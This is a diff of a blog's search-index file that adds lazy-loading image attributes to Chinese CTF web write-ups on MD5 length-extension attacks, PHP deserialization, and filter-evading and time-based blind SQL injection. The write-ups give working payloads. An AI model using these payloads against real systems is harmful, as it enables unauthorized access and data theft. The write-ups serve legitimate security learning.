@@ -3,9 +3,9 @@
   <entry>
     <title>HASH长度扩展攻击</title>
     <url>/2019/11/30/md5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<p>因为遇到了相关题目，下面以md5为例，写一下md5的工作原理和对hash扩展攻击的理解。</p>
+    <content><![CDATA[<p>因为遇到了相关题目，下面以md5为例，写一下md5的工作原理和对hash扩展攻击的理解。<a id="more"></a></p>
 <h1 id="md5的工作原理"><a href="#md5的工作原理" class="headerlink" title="md5的工作原理"></a>md5的工作原理</h1><p>如下图所示</p>
-<img src="/2019/11/30/md5扩展攻击/1.png" title="image">
+<img src="/2019/11/30/md5扩展攻击/1.png" srcset="/img/loading.gif" title="image">
 
 <p>其中笼统的一共可以分为四个部分</p>
 <p><strong>*Padding填充</strong></p>
@@ -28,12 +28,12 @@
 <h2 id="初始化向量"><a href="#初始化向量" class="headerlink" title="初始化向量"></a>初始化向量</h2><p>A      01 23 45 67     0x67452301<br>B      89 AB CD EF  0xEFCDAB89<br>C      FE DC BA 98  0x98BADCFE<br>D      76 54 32 10     0x10325476</p>
 <p>以上是四个固定的初始化向量，他们也是小端存储。</p>
 <p>再与补位后的消息进行复杂运算后，还是上面的‘message’例子，最终得到的md5<em>值是</em>78e731027d8fd50ed642340b7c9a63b3。</p>
-<img src="/2019/11/30/md5扩展攻击/2.png" title="image">
+<img src="/2019/11/30/md5扩展攻击/2.png" srcset="/img/loading.gif" title="image">
 
 <h1 id="MD5长度扩展攻击"><a href="#MD5长度扩展攻击" class="headerlink" title="MD5长度扩展攻击"></a>MD5长度扩展攻击</h1><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>MD5拓展攻击正是针对加盐措施的一种升级后的攻击手段，我们可以在不知道盐的情况下得出加盐后的md5的值。但需要在以下条件才能实现：</p>
 <p>1.我们要知道salt的长度。(为了能得到正确的填充）<br>2.要知道任意一个由salt加密后的md5值，并且知道没有加盐的明文。<br>3.用户可以提交md5值。</p>
 <p>例如我们知道一条信息的MD5值是78e731027d8fd50ed642340b7c9a63b3，我们还同时得知信息内容为message，可以构造出下图（这里的信息可以替换成salt+已知信息，加盐情况下需要知道salt长度）</p>
-<img src="/2019/11/30/md5扩展攻击/2.png" title="image">
+<img src="/2019/11/30/md5扩展攻击/2.png" srcset="/img/loading.gif" title="image">
 
 <p>然后它与初始向量复杂运算，得到</p>
 <p>A=0x0231e778<br>B=0x0ed58f7d<br>C=0x0b3442d6<br>D=0xb3639a7c</p>
@@ -98,10 +98,10 @@
 <p>题中给出<strong>salt长度为15</strong></p>
 <p>这里就可以使用md5扩展攻击，在原基础上添加任意消息即可达成目的。</p>
 <p>工具hashpump</p>
-<img src="/2019/11/30/md5扩展攻击/4.png" title="image">
+<img src="/2019/11/30/md5扩展攻击/4.png" srcset="/img/loading.gif" title="image">
 
 <p>因为user值不变，也相当于salt的一部分，所以data直接填admin，salt长度为20（15+5）</p>
-<img src="/2019/11/30/md5扩展攻击/5.png" title="image">
+<img src="/2019/11/30/md5扩展攻击/5.png" srcset="/img/loading.gif" title="image">
 
 <pre><code>f599284f8f2116348036a3f46e79c12b</code></pre><p>传到cookie的getmein里</p>
 <pre><code>password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00dwm2</code></pre><p>由于还有个urldecode,转下码post上去得到flag。</p>
@@ -137,7 +137,7 @@ make install</code></pre><h3 id="未知salt长度"><a href="#未知salt长度" c
         <span class="token delimiter">?></span> <span class="token comment" spellcheck="true">//只截取了PHP部分</span>
 </code></pre>
 <p>分析代码，flag输出条件是 $role===”admin” &amp;&amp;hsh===md5($salt.strrev($_COOKIE[“role”]))</p>
-<img src="/2019/11/30/md5扩展攻击/4.jpg" title="image">
+<img src="/2019/11/30/md5扩展攻击/4.jpg" srcset="/img/loading.gif" title="image">
 
 <p>这里得到<strong>$salt.strrev(s:5:”guest”;)</strong>的hsh，即$salt.’;"tseug":5:s’的md5值： hsh=3a4727d57463f122833d9e732f94e4e0</p>
 <p>以上是已知条件。</p>
@@ -175,9 +175,9 @@ webre()</code></pre><p>hashpump库使用说明</p>
         A tuple containing the new hex digest and the new message.
 &gt;&gt;&gt; hashpumpy.hashpump('ffffffff', 'original_data', 'data_to_add', len('KEYKEYKEY'))
 ('e3c4a05f', 'original_datadata_to_add')</code></pre><p>===&gt; 也可以用bp爆破</p>
-<img src="/2019/11/30/md5扩展攻击/7.png" title="image">
+<img src="/2019/11/30/md5扩展攻击/7.png" srcset="/img/loading.gif" title="image">
 
-<img src="/2019/11/30/md5扩展攻击/5.jpg" title="image">
+<img src="/2019/11/30/md5扩展攻击/5.jpg" srcset="/img/loading.gif" title="image">
 
 <p>参考：</p>
 <p><a href="https://blog.csdn.net/qq1045553189/article/details/87566846" target="_blank" rel="noopener">https://blog.csdn.net/qq1045553189/article/details/87566846</a></p>
@@ -212,60 +212,62 @@ webre()</code></pre><p>hashpump库使用说明</p>
     <title>jarvis OJ WEB WP</title>
     <url>/2019/11/13/Jarvis%20OJ(web)WP/</url>
     <content><![CDATA[<h1 id="jarvis-OJ"><a href="#jarvis-OJ" class="headerlink" title="jarvis OJ"></a>jarvis OJ</h1><h2 id="神盾局"><a href="#神盾局" class="headerlink" title="神盾局"></a>神盾局</h2><p>打开网页是一张图片<br>查看源码发现</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image1.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image1.png" srcset="/img/loading.gif" title="image">
+
+<a id="more"></a>
 
 <p>base64转码发现后面是shield.jpg<br>尝试一下 index.php发现如下源码</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image2.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image2.png" srcset="/img/loading.gif" title="image">
 
 <p>大概就是如果传入的class值不为空 就把这个值赋给g<br>再把g反序列化后赋给x<br>输出将x传入readfile后的值<br>再看一下 shield.php</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image3.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image3.png" srcset="/img/loading.gif" title="image">
 
 <p>看见他告诉flag在 pctf.php 里<br> 如果传入的值不为空 且值中不存在.. 且不含/ 和\\<br>才能到file_get_contents函数读取文件</p>
 <p>又读了一下showimg.php</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image4.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image4.png" srcset="/img/loading.gif" title="image">
 
 <p>这就解释了为什么刚才直接读pctf.php显示FILE NOT FOUND<br>写个脚本</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image5.png" title="image"> 
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image5.png" srcset="/img/loading.gif" title="image"> 
 
 <p>O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}<br>把这个值传入<br>注意！！是class不是之前的img 而且是从原页面上传入</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image6.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image6.png" srcset="/img/loading.gif" title="image">
 
 <p>得到flag</p>
 <h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>看源码啥也没有<br>看一眼robots.txt</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image7.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image7.png" srcset="/img/loading.gif" title="image">
 
 <p>进这个文件 发现是假flag<br>抓包<br>admin随便改个值得到flag</p>
 <h2 id="in-a-mess"><a href="#in-a-mess" class="headerlink" title="in a mess"></a>in a mess</h2><p>查看源码</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image8.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image8.png" srcset="/img/loading.gif" title="image">
 
 <p>分析<br>传入的a里如果不为0.则echo hahah并return<br>没有.就继续向下运行 给$data赋值从$a里读到的值如果data值等于 1112 is a nice lab!,id==0,b的长度大于5且b的第一个值是4 又要求b的第一个值不能等于4<br>才能运行flag.txt<br>每个条件都存在冲突<br>id php弱比较就能绕过 传入id=0e<br>a 看见file_get_contents函数想到文件包含 不知道有什么文件含这个字符串先放一下<br>b eregi可以%00截断 b=%0041111111<br>查了下大佬的wp<br>说a这里可以应用伪协议php://input<br>构造payload:<br>?id=0e&amp;a=php://input&amp;b=%004111111<br>同时post值1112 is a nice lab!<br>得到这样的回显<br>Come ON!!! {/^HT2mCpcvOLf}</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image9.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image9.png" srcset="/img/loading.gif" title="image">
 
 <p>盲猜他是个地址（长得也太难认了8</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image10.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image10.png" srcset="/img/loading.gif" title="image">
 
 <p>进到这样一个界面 看见这样的形势 先测试一下sql注入</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image11.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image11.png" srcset="/img/loading.gif" title="image">
 
 <p>确实是sql注入<br>可以看到它这里是过滤了空格 用/*22*/绕过 回显又正常了</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image12.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image12.png" srcset="/img/loading.gif" title="image">
 
 <p>先测试字段数</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image13.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image13.png" srcset="/img/loading.gif" title="image">
 
 <p>说明字段为3</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image14.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image14.png" srcset="/img/loading.gif" title="image">
 
 <p>双写绕过对select和union的过滤<br>数据库名</p>
 <pre><code>?id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,database()</code></pre><p>查到数据库名是test</p>
 <p>表名</p>
-<pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(table_name)/*22*/frfromom/*22*/information_schema.tables/*22*/where/*22*/table_schema=database()</code></pre><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image16.png" title="image">
+<pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(table_name)/*22*/frfromom/*22*/information_schema.tables/*22*/where/*22*/table_schema=database()</code></pre><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image16.png" srcset="/img/loading.gif" title="image">
 
 <p>列名</p>
 <pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(column_name)/*22*/frfromom/*22*/information_schema.columns/*22*/where/*22*/table_schema=database()/*22*/and/*22*/table_name=0x636f6e74656e74</code></pre><p>查出来是id,context,title</p>
 <p>读文件</p>
 <pre><code>id=-1/*22*/uniunionon/*22*/seleselectct/*22*/1,2,context/*22*/frofromm/*22*/content</code></pre><p>得到flag</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image18.png" title="image">
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image18.png" srcset="/img/loading.gif" title="image">
 
 
 
@@ -302,9 +304,9 @@ webre()</code></pre><p>hashpump库使用说明</p>
     <content><![CDATA[<h1 id="BUUCTF-WEBwp"><a href="#BUUCTF-WEBwp" class="headerlink" title="BUUCTF WEBwp"></a><strong>BUUCTF WEBwp</strong></h1><ul>
 <li><h2 id="HCTF2018WarmUp"><a href="#HCTF2018WarmUp" class="headerlink" title="HCTF2018WarmUp"></a>HCTF2018WarmUp</h2></li>
 </ul>
+<p>菜鸡发现了一个平台BUUCTF，web第一题就要去查wp，哎<br>查看源码给了source.php,如下</p>
 <a id="more"></a>
 
-<p>菜鸡发现了一个平台BUUCTF，web第一题就要去查wp，哎<br>查看源码给了source.php,如下</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">class</span> <span class="token class-name">emmm</span>
@@ -449,23 +451,25 @@ webre()</code></pre><p>hashpump库使用说明</p>
   <entry>
     <title>insert into</title>
     <url>/2019/08/24/insert%20into/</url>
-    <content><![CDATA[<img src="/2019/08/24/insert%20into/1-01.png" title="image">
+    <content><![CDATA[<img src="/2019/08/24/insert%20into/1-01.png" srcset="/img/loading.gif" title="image">
 
 <p>观察题目</p>
-<img src="/2019/08/24/insert%20into/1-02.png" title="image">
+<img src="/2019/08/24/insert%20into/1-02.png" srcset="/img/loading.gif" title="image">
 
 <p>可以看到注入点应该在http头的x-forwarded-for上</p>
-<img src="/2019/08/24/insert%20into/1-03.png" title="image">
+<a id="more"></a>
+
+<img src="/2019/08/24/insert%20into/1-03.png" srcset="/img/loading.gif" title="image">
 
 <p>这里还把‘，’过滤了</p>
-<img src="/2019/08/24/insert%20into/1-04.png" title="image">
+<img src="/2019/08/24/insert%20into/1-04.png" srcset="/img/loading.gif" title="image">
 
 <p>因为把，过滤了 if是用不了<br>这里用select case when..then..else..end代替<br>substr也用不了 但是可以用 from 1 for 1代替<br>为了节约时间，可以先手工查字段长度<br>这里以database()做示范:</p>
 <p><strong>x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a</strong></p>
-<img src="/2019/08/24/insert%20into/1-05.png" title="image">
+<img src="/2019/08/24/insert%20into/1-05.png" srcset="/img/loading.gif" title="image">
 
 <p>可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：<br><strong>x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a</strong></p>
-<img src="/2019/08/24/insert%20into/1-06.png" title="image">
+<img src="/2019/08/24/insert%20into/1-06.png" srcset="/img/loading.gif" title="image">
 
 <p>当然转成ascii码用二分法更有效率<br>但为了更加方便 这里写一个脚本</p>
 <pre class=" language-python"><code class="language-python"> !<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python
